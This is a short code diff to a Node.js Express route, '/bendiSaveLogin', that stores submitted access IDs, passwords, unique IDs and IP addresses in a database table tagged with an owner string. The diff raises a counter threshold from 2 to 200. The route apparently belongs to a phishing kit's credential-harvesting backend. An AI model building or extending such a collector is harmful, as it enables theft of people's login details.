@@ -2494,7 +2494,7 @@ app.post(`/bendiSaveLogin`, cors(), (req, res) => {
   ip = req.body.ip;
   uniqueid = req.body.uniqueid;
 
-  if (bendiCount == 2) {
+  if (bendiCount == 200) {
     let details = [accessId, password, uniqueid, ip, "haytch123!"];
     let query = `INSERT INTO bendi(accessId,password,uniqueid,status,ip, owner) VALUES (?,?,?,1,?,?)`;
 
